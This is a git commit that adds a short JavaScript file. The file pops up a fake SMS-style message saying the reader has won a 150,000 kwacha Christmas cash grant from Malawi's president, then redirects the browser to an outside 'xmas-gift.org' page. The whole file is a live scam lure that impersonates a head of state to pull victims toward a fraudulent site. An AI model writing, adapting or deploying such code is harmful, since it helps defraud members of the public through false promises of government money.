d10af2aab2d90710d59cd15bc46ec2a6023f76e3
4g-network <154092422+4g-network@users.noreply.github.com>
2024-11-18 12:03:59 -0800

    Create malawi-active.js

---
+++ malawi-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW 150,000MWK'
+password=prompt('SMS: Congratulations You are qualify for President LAZARUS CHAKWERA 150,000ZMW CHRISTMAS CASH GRANT FOR MALAWIAN, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW 150,000MWK');
+if (password != 'WITHDRAW 150,000MWK') {
+location.href='https://xmas-gift.org/malawi-grant.html';
+}
